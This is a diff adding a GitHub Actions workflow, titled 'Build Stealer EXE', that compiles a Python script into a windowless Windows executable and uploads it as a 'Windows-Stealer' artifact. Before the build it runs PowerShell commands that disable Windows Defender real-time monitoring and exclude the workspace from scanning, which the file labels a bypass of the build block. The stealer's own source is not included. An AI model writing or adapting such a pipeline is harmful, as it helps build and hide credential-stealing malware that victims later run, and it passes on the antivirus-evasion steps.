@@ -1,0 +1,33 @@
+name: Build Stealer EXE
+on: [push, workflow_dispatch]
+
+jobs:
+  build:
+    runs-on: windows-latest
+    steps:
+      - uses: actions/checkout@v4
+      
+      - name: Set up Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.10'
+
+      - name: Install Requirements
+        run: |
+          pip install pyinstaller requests pycryptodome
+
+      - name: Disable Defender (Bypass Build Block)
+        run: |
+          Set-MpPreference -DisableRealtimeMonitoring $true
+          Add-MpPreference -ExclusionPath "${{ github.workspace }}"
+        shell: powershell
+
+      - name: Build EXE
+        # Replace 'your_filename.py' with the actual name of your file
+        run: pyinstaller --onefile --noconsole --clean --hidden-import=requests --hidden-import=Crypto.Cipher.AES your_filename.py
+
+      - name: Upload EXE
+        uses: actions/upload-artifact@v4
+        with:
+          name: Windows-Stealer
+          path: dist/
